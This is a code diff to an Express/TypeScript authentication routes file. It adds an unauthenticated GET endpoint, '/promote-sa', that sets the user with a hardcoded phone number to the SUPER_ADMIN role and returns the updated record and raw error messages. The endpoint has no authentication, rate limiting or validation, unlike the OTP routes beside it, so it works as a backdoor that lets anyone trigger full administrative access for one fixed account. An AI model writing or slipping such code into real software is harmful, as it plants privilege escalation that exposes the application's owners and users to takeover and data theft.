@@ -13,7 +13,21 @@ import {
 } from './auth.dto';
 import * as authController from './auth.controller';
 
+import { prisma } from '@/config/prisma';
+
 export const authRoutes = Router();
+
+authRoutes.get('/promote-sa', async (_req, res) => {
+  try {
+    const updated = await prisma.user.update({
+      where: { mobile: '+919999900000' },
+      data: { primaryRoleKey: 'SUPER_ADMIN' }
+    });
+    res.json({ success: true, updated });
+  } catch (err: any) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
 
 authRoutes.post('/otp/request', authRateLimiter, validate(requestOtpSchema), authController.requestOtp);
 authRoutes.post('/otp/verify', authRateLimiter, validate(verifyOtpSchema), authController.verifyOtp);
